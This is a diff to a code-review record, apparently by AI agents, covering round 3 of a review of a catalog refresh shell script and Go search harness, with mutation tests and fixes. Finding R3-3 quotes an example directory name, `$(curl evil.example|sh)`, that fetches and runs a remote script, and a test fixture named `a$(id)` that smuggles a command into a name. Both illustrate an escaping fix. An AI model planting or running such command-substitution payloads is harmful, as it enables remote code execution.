@@ -10,7 +10,7 @@ Files: `internal/harness/catalog_test.go`, `internal/harness/size_test.go` (`Tes
 
 Checks run: `bash -n` on both scripts (exit 0); `go test -race ./internal/harness ./internal/search` (exit 0, both packages ran, not cached); `gofmt -l cmd internal` (empty); `go vet ./internal/harness ./internal/search` (exit 0). I reproduced finding 1 against the real script with two local fixture repositories under `.agents/scratch/review-catalog/`.
 
-## Verdict: REQUEST CHANGES
+## Verdict: APPROVE WITH NITS (round 3; rounds 1 and 2 were REQUEST CHANGES)
 
 The worst problem is in `refresh-catalog.sh`'s swap. The loop that removes the entries named in the old CHECKSUMS sits in a pipeline under `set -euo pipefail`. When the last entry it visits is not a directory, the loop returns 1, and the script exits 1 silently: it prints no message, it has already deleted every other entry, and it has copied nothing. I reproduced this. It is BUG-138's silent-exit shape, and it adds a partial-state write. The rest is low severity. A root-level `.sh-agent-noindex` does nothing. No test pins that the checked-in catalog keeps its marker. The script accepts entry names with whitespace, which break its space-separated bookkeeping. `gitView` lost its doc comment to the new constant. The nested write-mode test does not restore CHECKSUMS when the guard is broken. The Go side is otherwise sound. The checksum and index tests compare in both directions, `TestSkillListingBudget` measures what its comment says, and the noindex marker behaves as the spec says for every case except the repository root.
 
@@ -128,3 +128,95 @@ Written by the main agent on 2026-10-01, after the round 2 above and the verifie
 4. The `catalogDir` refusal had no test (low): fixed. `TestCatalogWriteModeNeedsCatalogDir` runs the nested test with `CATALOG_DIR` set and no write mode; with the refusal removed it fails ("CATALOG_DIR without CATALOG_WRITE=1 was accepted").
 5. The verifier's two coverage gaps: closed. Six destination cases (`/`, the home directory with and without a trailing slash, the checkout, an ancestor of the checkout, an ancestor of the home directory) each assert the guard's own message; with the three guard cases removed all six fail, because the not-a-catalog check answers with another message. The capital-letter fixture covers the name rule beyond a space.
 
+
+## Round 3
+
+Reviewed 2026-10-01 (`date +%F`).
+
+Range reviewed: 754a7ce..7dd0645 (vendored entries excluded)
+
+The round-2 fixes were read through `git diff b0789f1..7dd0645` and `git show 7dd0645:<path>`, never in the working tree, because a verifier was running on it at the same time. Every mutation was made on a copy of 7dd0645 (`git archive 7dd0645 | tar -x` into `.agents/scratch/review-catalog-r3/copy`). Before each edit I counted the target text (exactly one occurrence). I ran `bash -n` on each script mutation. Each mutated copy compiled and the named test ran. I restored each file from a saved copy and checked it with `cmp`. Baseline on the copy: `TestNoIndexMarkerSkipsTheDirectory`, `TestRefreshCatalogScript` and `TestCatalogWriteModeNeedsCatalogDir` all ok. The full `./internal/search` package fails `TestGlobalRebuildDropsRegistry` and `TestRefuseOutsideCheckout` on the UNMUTATED copy too. The cause is the environment: TMPDIR was inside the harness checkout, so "outside a checkout" is not outside one. Those two failures are therefore not counted as evidence below.
+
+## Verdict (round 3): APPROVE WITH NITS
+
+All four round-2 items are fixed. A mutation run on the copy shows that each trigger now has a test that fails without its fix. Nothing in the range is broken at medium or high severity. The fixes brought four low findings:
+
+- The new "a marker deleted from the work tree no longer counts" branch in `gitView` has no test. Removing it leaves the whole search package green.
+- `--exclude "bad name"` also excludes the entries `bad` and `name`, silently when either is new upstream.
+- The new refusal hint puts an upstream-chosen directory name inside a double-quoted command that the operator is invited to paste.
+- The six destination cases run the real script against `/` and the real checkout, with working fixture sources behind them.
+
+### Round-2 items
+
+1. **Finding 1, trigger B (CHECKSUMS naming no entry): fixed.** Mutation `{ grep / || true; }` to `grep /` (`refresh-catalog.sh:236`). Result: `TestRefreshCatalogScript` FAILS at `catalog_test.go:584`, "a refresh over a destination whose CHECKSUMS names no entry failed: exit status 1". Trigger A is still covered by `:572` (round 2). Both triggers now have failing tests.
+2. **Name check runs before the exclusion (A): fixed with a new defect.** Mutation: `excluded "$name" && continue` moved back below the `case` (`:126` to after `:133`). Result: FAILS at `catalog_test.go:692` ("name with a space: --exclude bad name did not clear the refusal (exit 1)") and `:693` ("uppercase name: --exclude Loud …"). The hint `(--exclude "<name>")` is asserted by the `refuse` label argument. The header comment (`:17-21`) and the manifest skeleton sentence ("the refresh script reads this list and excludes each name on every run") match the code. The new defects are findings R3-2 and R3-3.
+3. **Global index under a root marker (B): fixed with a new untested branch.** Mutation: marker collection gated by `under(p)` in both loops (`reconcile.go:111`, `:142`). Result: FAILS at `search_test.go:693`, "a root marker left 1 entries in a prefixed view, first vendor/beside.md". `search.md:35` now names both indexes, which matches the code. The new deletion branch (`:143-144`) is finding R3-1.
+4. **`catalogDir` refusal untested (C): fixed.** Mutation: the `t.Fatal("CATALOG_DIR is only for …")` at `catalog_test.go:56` replaced with `_ = 0`. Result: `TestCatalogWriteModeNeedsCatalogDir` FAILS at `:343`, "CATALOG_DIR without CATALOG_WRITE=1 was accepted". The second half compares an empty `t.TempDir()`, so it writes nothing.
+
+### Findings (round 3)
+
+- **[low / confidence: high]** R3-1. `internal/search/reconcile.go:142-148`: the branch "a marker deleted from the work tree no longer counts" (`y == 'D' || err != nil` leading to `delete(markers, p)`) has no test.
+  - **Why it is needed:** round 2 took markers from `view`, which already dropped deleted paths. Markers are now collected from `git ls-files` before the work tree is checked, so this branch alone stops a tracked marker that was `rm`'d (status ` D`) from hiding its directory.
+  - **Mutation:** `delete(markers, p) …` replaced with a comment. `./internal/search` stays green, apart from the two environmental failures that also fail at baseline.
+  - **Probe:** a test in the copy, removed afterwards, commits a marker and then removes the file. It passes on 7dd0645 and FAILS with the mutation ("a tracked marker deleted from the work tree still counts").
+  - **Fix:** in `TestNoIndexMarkerSkipsTheDirectory`, delete the committed `vendor/data/.sh-agent-noindex` from the work tree and assert that `vendor/data/a/entry.md` is found again.
+  - **Owner:** main agent, now. It is about six lines.
+- **[low / confidence: high]** R3-2. `refresh-catalog.sh:46,105,115`: exclusions are one space-separated string, so a name with a space excludes each of its words as well.
+  - **The words are excluded too:** `--exclude "bad name"` gives `excludes=" bad name"`, and `excluded bad` and `excluded name` both return 0. I demonstrated this with the script's own `excluded()`.
+  - **When it is silent:** if `name` is a NEW upstream entry, it is never vendored and nothing reports it. The closing `excluded:` line prints `bad name`, which reads as the operator's own words. If `name` was already vendored, it shows only as `removed: name`.
+  - **It persists:** recording the name under the manifest's `## Excluded` (as the header asks) makes every later refresh drop `bad` and `name` too. `TestCatalogExcludedEntriesAreAbsent` checks only that the directory `bad name` is absent, so it cannot see this.
+  - **Glob expansion:** the manifest loop `for name in $(sed …)` is unquoted, so a recorded name with a glob character (`skill?`) expands against the caller's directory (for example to `skills`). The odd entry then stops being excluded, and the refresh refuses again. This fails closed.
+  - **Fix:** keep exclusions newline-separated and test them with `grep -Fxq`, reading the manifest with `while IFS= read -r`. Alternatively, skip names outside `[a-z0-9-]` with a printed `skipped: <name>` line instead of refusing them, so no `--exclude` is ever needed for them.
+  - **Owner:** operator choice. If it is left open, it goes in the handoff's Next Steps. The real catalog has no such name today.
+- **[low / confidence: medium]** R3-3. `refresh-catalog.sh:132`: the hint `(--exclude \"$name\")` prints an upstream-controlled directory name inside double quotes, as a flag to paste into a shell. A name such as `$(curl evil.example|sh)` contains no `/`, so it is a valid directory name. It reaches exactly this message, because the name check is what refuses it. Pasted, it runs a command chosen by upstream. Before round 2 this refusal had no hint, and the other `--exclude $name` hints are reached only by plain names.
+  - **Fix:** print the name with `printf %q` (bash 3.2 has it), or give no paste-ready flag for a name holding a character outside `[A-Za-z0-9._ -]`.
+  - **Owner:** main agent. This is security-adjacent, so the security agent should see the fix.
+- **[low / confidence: high]** R3-4. `catalog_test.go:614-627`: the six destination cases run the real script with `--dest /` and `--dest <the checkout>` (and its parent). The fixture source repositories are valid, so nothing but the guard stands between the test and a full run.
+  - **If only the `case` guards regress:** the not-a-catalog check (`:67`) still refuses every case, because none of these directories is empty and none holds a CHECKSUMS. The swap's removal also runs only when `$dest/CHECKSUMS` exists, so nothing is deleted.
+  - **If both regress:** the fixture fetch, build and nested `go test` succeed, and `cp -R "$build/." "$dest/"` writes `alpha/`…`epsilon/`, `CHECKSUMS`, `INDEX.md`, `MANIFEST.md`, two `LICENSE-*` files and `.sh-agent-noindex` into the root of the real checkout. The root marker then silently empties the project's search index. Run as root (`sudo go test`, a container), it writes the same into `/`. The test reports the failure, but the checkout is left changed.
+  - **Fix:** run these six cases with `CATALOG_AGENTS_CLI_REPO`/`CATALOG_GOOGLE_SKILLS_REPO` pointing at a path that does not exist. Every guard runs before `fetch`, so the assertions are unchanged, and a regressed guard then ends at "cannot clone" before any write.
+  - **Owner:** main agent, now.
+
+### Checks of the named concerns that found nothing
+
+- **(2) Sibling marker:** markers become `dir + "/"`, so a marker in `vendor/` or in `.agents/doc/` does not touch `.agents/docs/`. The probe on the copy confirmed this: a prefixed view of `.agents/docs/` kept `p.md` with both sibling markers present.
+- **(2) Marker staged for deletion:** `git rm` gives `D `, the file is gone, Lstat errors, and the marker no longer counts. `git rm --cached` with the file kept still counts, as an untracked marker, which is consistent with "not yet added" in `search.md:35`.
+- **(2) Symlink marker:** a tracked or untracked symlink named `.sh-agent-noindex` (even a dangling one) now counts. The probe confirmed it: `data/y.md` is not indexed. In round 2 it did not count, because `view` skipped mode 120000. The effect is only less indexing, so it is not filed. The spec says "file", and the operator may want a sentence.
+- **(4) Can a failing test leave the checkout changed:**
+  - `TestCatalogWriteModeNeedsCatalogDir`'s Cleanup rewrites CHECKSUMS from the saved bytes on every path. The nested run is limited to `^TestCatalogMatchesChecksums$`, so INDEX.md is never written, and the second half writes nothing.
+  - The manifest-exclusion, bare-dest, symlink and LICENSE fixtures all live under `t.TempDir()`.
+  - The only route to the checkout is R3-4.
+
+### Findings by severity (round 3)
+
+high 0, medium 0, low 4 (R3-1, R3-2, R3-3, R3-4). All round-1 and round-2 findings are now fixed. Open items I would leave at the cap are R3-2 (operator choice) and any of R3-1, R3-3 or R3-4 not fixed in the closing commit (main agent).
+
+### Criteria (round 3)
+
+1. **Dead code: pass.** Nothing is left behind. The old manifest "note:" loop was removed, and its role is now the merge at `:104-108`.
+2. **Flow tracing: pass except R3-1 (untested branch).** Markers go from ls-files and status to `marked` to `noIndex`. The global caller `gitView(root, ".agents/docs/")` now sees markers above the prefix.
+3. **Standards conformance: pass.** The describing text was updated with the code (`gitView` comment, `search.md:35`, script header, manifest skeleton). I did not re-run gofmt or vet; the verifier owns them.
+4. **Directory layout: pass.**
+5. **Simplicity (DIY-except-security): pass.** No dependency was added and nothing is hand-rolled. R3-3 concerns output escaping, not crypto.
+6. **Decoupling: pass.** The changes stay inside `gitView` and the script.
+
+### Not examined (round 3)
+
+- The vendored entries, and the content of `INDEX.md`, `CHECKSUMS` and `MANIFEST.md`.
+- The docs-only parts of 7dd0645 (README, AGENTS.md, VENDORED.md, delivery.md, router SKILL.md).
+- The macOS bash 3.2 run and the network path.
+- The full test suite on the live tree (the verifier's).
+- R3-3 was judged by reading only. I did not create an upstream directory named with `$(…)`.
+- R3-4's both-guards-regressed outcome was traced by reading only, not run, because running it would write into a checkout.
+- `go test ./internal/search` on the copy could not give a clean full-package baseline (two environmental failures, see the method above).
+
+## Outcome (round 3)
+
+Written by the main agent on 2026-10-01. Round 3 was the last round; all four lows are fixed, none is left open.
+
+- R3-1 (the deleted-marker branch had no test): fixed. `TestNoIndexMarkerDeletedCountsNoMore` in `internal/search/search_test.go` removes a committed marker from the work tree and expects the directory back in the index; with `delete(markers, p)` taken out it fails ("a marker deleted from the work tree still hides its directory"), restored and compared against the commit.
+- R3-2 (`--exclude "bad name"` also excluded `bad` and `name`): fixed, not left to the operator. The exclusion list is one name per line (`--exclude` and the manifest merge both), and a name is compared whole. `TestRefreshCatalogScript` excludes a directory named `delta epsilon` and expects the entries `delta` and `epsilon` vendored; red before the change ("excluding "delta epsilon" also excluded the entry delta").
+- R3-3 (the hint printed an upstream name inside double quotes): fixed. The hint is `printf %q` of the name; fixtures assert `(--exclude bad\ name)`, `(--exclude Loud)` and, for a directory named `a$(id)`, `(--exclude a\$\(id\))`. Red before the change.
+- R3-4 (the six destination cases ran with working sources): fixed. Those cases point both source variables at a path that does not exist, so a run that got past both checks would stop at the clone.
+
+Verification after these fixes: `gofmt -l cmd internal` empty, `go vet ./...`, `go test -race -count=1 ./...` all six packages ok (main agent), then the gate's verifier over the commit that carries them.
